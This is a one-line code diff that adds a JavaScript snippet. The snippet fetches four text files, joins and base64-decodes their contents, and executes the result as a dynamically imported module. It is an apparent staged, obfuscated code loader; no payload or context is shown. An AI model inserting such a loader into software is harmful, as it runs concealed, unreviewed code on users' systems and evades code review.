@@ -1,0 +1,1 @@
+(async()=>{let b='';for(let i=0;i<4;i++)b+=await(await fetch(`code${i}.txt`)).text();const u=URL.createObjectURL(new Blob([Uint8Array.from(atob(b),c=>c.charCodeAt(0))],{type:'text/javascript'}));try{await import(u)}finally{URL.revokeObjectURL(u)}})();
